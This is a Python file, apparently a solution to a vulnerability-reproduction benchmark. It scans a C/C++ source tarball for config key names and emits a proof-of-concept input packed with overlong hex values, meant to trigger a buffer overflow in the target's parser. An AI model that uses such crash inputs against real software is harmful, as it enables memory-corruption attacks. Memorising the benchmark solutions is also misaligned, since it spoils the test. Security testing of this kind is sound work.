import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        keys = self._extract_config_keys_from_tar(src_path)
        if keys:
            return self._build_poc_with_keys(keys)
        return self._build_generic_poc()

    def _extract_config_keys_from_tar(self, src_path):
        keys = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for mem in tf.getmembers():
                    if not mem.isreg():
                        continue
                    name = mem.name
                    lower = name.lower()
                    if not lower.endswith((".c", ".cpp", ".cc", ".cxx", ".h", ".hpp")):
                        continue
                    f = tf.extractfile(mem)
                    if not f:
                        continue
                    try:
                        data = f.read(2000000)
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    keys.extend(self._extract_keys_from_text(text))
        except Exception:
            return []
        unique = []
        seen = set()
        for k in keys:
            if k not in seen:
                seen.add(k)
                unique.append(k)
        return unique

    def _extract_keys_from_text(self, text):
        keys = []
        strcmp_pattern = re.compile(
            r'str(?:n)?(?:case)?cmp\s*\(\s*("([^"]+)"|[A-Za-z_][A-Za-z0-9_]*)\s*,\s*("([^"]+)"|[A-Za-z_][A-Za-z0-9_]*)',
            re.MULTILINE,
        )
        for m in strcmp_pattern.finditer(text):
            for group_index in (1, 3):
                token = m.group(group_index)
                if not token:
                    continue
                if token.startswith('"') and token.endswith('"') and len(token) >= 2:
                    s = token[1:-1]
                    if self._is_potential_key(s):
                        keys.append(s)

        # Extra: look for hex-related literals even if not in strcmp
        literal_pattern = re.compile(r'"([A-Za-z0-9_.-]{1,64})"')
        for m in literal_pattern.finditer(text):
            s = m.group(1)
            if not self._is_potential_key(s):
                continue
            sl = s.lower()
            if any(sub in sl for sub in ("hex", "color", "rgb", "addr", "address", "key", "token", "hash", "id", "secret", "seed", "value")):
                keys.append(s)

        return keys

    def _is_potential_key(self, s: str) -> bool:
        if len(s) < 1 or len(s) > 64:
            return False
        for ch in s:
            if not (ch.isalnum() or ch in "_-."):
                return False
        return True

    def _build_poc_with_keys(self, keys):
        hex_long = "A" * 600
        hex_med = "B" * 260

        priority_subs = (
            "hex",
            "color",
            "rgb",
            "addr",
            "address",
            "key",
            "token",
            "hash",
            "id",
            "secret",
            "seed",
            "value",
        )

        def score_key(k):
            kl = k.lower()
            score = 0
            for idx, sub in enumerate(priority_subs):
                if sub in kl:
                    score = len(priority_subs) - idx
                    break
            return -score, len(k)

        ordered_keys = sorted(keys, key=score_key)
        max_keys = 4
        selected = ordered_keys[:max_keys]
        if not selected:
            return self._build_generic_poc()

        lines = []

        first = selected[0]
        lines.append(f"{first} = 0x{hex_long}")
        lines.append(f"{first}=0x{hex_long}")
        lines.append(f"{first}: 0x{hex_long}")
        lines.append(f"{first} 0x{hex_long}")

        for key in selected[1:]:
            val = hex_med
            lines.append(f"{key} = 0x{val}")
            lines.append(f"{key}=0x{val}")
            lines.append(f"{key}: 0x{val}")
            lines.append(f"{key} 0x{val}")

        pair_keys = selected[:4]
        for i in range(len(pair_keys)):
            for j in range(len(pair_keys)):
                k1 = pair_keys[i]
                k2 = pair_keys[j]
                val = hex_med
                lines.append(f"{k1} {k2} 0x{val}")

        lines.append("0x" + hex_long)
        lines.append(hex_long)

        text = "\n".join(lines) + "\n"
        return text.encode("ascii")

    def _build_generic_poc(self):
        hex_long = "A" * 600
        hex_med = "B" * 260
        lines = [
            "hex_value = 0x" + hex_long,
            "hex: 0x" + hex_med,
            "hex 0x" + hex_med,
            "color #" + hex_med,
            "0x" + hex_long,
            hex_long,
            "[hex_section]",
            "hex_value=" + hex_med,
            "hex_value: " + hex_med,
            '{"hex": "0x' + hex_med + '"}',
        ]
        text = "\n".join(lines) + "\n"
        return text.encode("ascii")